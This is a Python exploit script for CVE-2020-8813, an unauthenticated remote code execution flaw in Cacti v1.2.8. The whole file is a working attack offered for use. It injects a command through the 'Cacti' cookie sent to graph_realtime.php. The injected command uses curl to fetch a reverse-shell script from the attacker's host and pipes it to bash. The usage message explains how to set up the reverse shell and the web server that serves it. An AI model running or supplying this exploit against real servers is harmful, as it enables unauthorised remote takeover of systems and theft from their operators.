#!/usr/bin/python3
# Exploit Title: Cacti v1.2.8 Unauthenticated Remote Code Execution
# Date: 04/21/2021
# Exploit Author: m4ud(Felipe Donato)
# CVE: CVE-2020-8813
# Vendor Homepage: https://cacti.net/
# Version: v1.2.8
# Tested on: CentOS 7.3,Ubuntu 16.04, Debian9, Debian 10 / PHP 7.1.33, PHP 7.0


import requests
import sys
import warnings
from bs4 import BeautifulSoup
from urllib.parse import quote


warnings.filterwarnings("ignore", category=UserWarning, module='bs4')


if len(sys.argv) != 4:
    print("[~] Create reverse shell for Upload.\r\n[~] Start WebServer on Port 80\r\n[~] Usage : ./Cacti-exploit.py url ip shell-name")
    exit()

url = sys.argv[1]
ip = sys.argv[2]
shell = sys.argv[3]

def send_exploit(url):
    payload = ";curl${IFS}%s/%s|bash" % (ip, shell)
    cookies = {'Cacti': quote(payload)}
    path = url+"/graph_realtime.php?action=init"
    print("[+] S3nd1ng 3v1l r3qu3st, SHELL????")
    print("[+] Burn1ng C4ct1!!")
    requests.get(path, cookies=cookies)

send_exploit(url)
